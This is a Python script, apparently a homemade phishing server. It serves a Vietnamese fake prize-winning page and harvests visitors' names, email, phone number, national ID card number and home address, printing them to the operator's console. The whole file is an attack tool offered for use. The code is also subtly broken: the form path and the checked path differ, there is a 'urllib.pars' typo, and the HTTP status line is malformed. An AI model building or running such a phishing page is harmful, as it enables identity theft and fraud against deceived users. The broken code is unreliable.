import socket
import os
import time
import urllib.parse

os.system('cls')

IP = str(input("HOSTING NAME : "))
PORT = int(input("PORT IP  : "))

HOSTING_NAME = f'http://{IP}:{PORT}/'

payload_name = 'reverse/http/phishing'

def handler_phishing():
	while True:
		handler_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		handler_conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 3)
		handler_conn.bind((IP, PORT))
		handler_conn.listen(3)

		print(f'Server listening on host {HOSTING_NAME}')

		handler_connect, handler_address = handler_conn.accept()

		code_html = """
		<!DOCTYPE html>
		<html>
		<head>
			<meta charset="utf-8">
			<meta name="viewport" content="width=device-width, initial-scale=1">
			<title>Đổi Quà, CHúng Thưởng, </title>
			</head>

		<body style="background-image: url('https://www.toyota.com.vn/media/o2vlqlfq/62281c8f4761654980c608f8e78129ad.jpg');">
	    	
	    	<img src="https://png.pngtree.com/png-vector/20210221/ourlarge/pngtree-wheel-of-luck-casino-jackpot-design-with-golden-glittering-playing-prize-png-image_2928672.png" width="200" height="200">
		    
		    <h1>Bạn Đã Trúng Thưởng</h1>
		    <h2>Đăng Ký Để Nhận Quà</h2>
		    <h2>Vui Lòng nhập thông tin để nhận thưởng</h2>
		    <form action="/doi-qua-chung-thuong">
		        <label for="lname">Họ : </label>
		        <input type="text" id="lusr" name="lusr" reaquired><br> 

		        <label for="fname">Tên : </label>
		        <input type="text" id="fusr" name="fusr" required><br>

		        <label for="mailer">Email : </label>
		        <input type="text" id="email" name="email" reaquired><br> 

		        <label for="phone">Số Điện Thoại : </label>
		        <input type="text" id="num" name="num" required><br>

		        <label for="card">Số CMND/CCCD : </label>
		        <input type="text" id="cmnd" name="cmnd" reaquired><br> 

		        <label for="address">Nơi ở, địa chỉ cụ thể : </label>
		        <input type="text" id="addr" name="addr" required><br>

		        <input type="submit" value="Đăng Ký">

		    </form>
		</body>
		</html>"""
			
		http_request = "HTTP/ 1.1 200 OK\r\n\r\n" + code_html
		handler_connect.send(http_request.encode())

		print(f'{handler_address} open link')

		output_data = handler_connect.recv(1024)
		data = output_data.decode()
		if '/doi-qua-trung-thuong' in data:
			print("Starting Update ouput DATABASE...")
			output = data.split("\r\n")
			for line in output:
				if "lusr=" in line:
					lusr = line.split("lusr=")[1].split("&")[0]
					lusr = urllib.parse.unquote(lusr)
					print(f"Last Name : {lusr}")

				if "fusr=" in line:
					fusr = line.split("fusr=")[1].split("&")[0]
					fusr = urllib.parse.unquote(fusr)
					print(f"Fist Name : {fusr}")

				if "email=" in line:
					email = line.split("email=")[1].split("&")[0]
					email = urllib.parse.unquote(email)
					print(f"Email : {email}")

				if "num=" in line:
					num = line.split("num=")[1].split("&")[0]
					num = urllib.pars.unquote(num)
					print(f"Phone Num : {num}")

				if "cmnd=" in line:
					cmnd = line.split("cmnd=")[1].split("&")[0]
					cmnd = urllib.parse.unquote(cmnd)
					print(f"Info Peole Card ID : {cmnd}")

				if "addr=" in line:
					addr = line.split("addr=")[1].split("&")[0]
					addr = urllib.parse.unquote(addr)
					print(f"Address : {addr}")

		handler_connect.close()

handler_phishing()
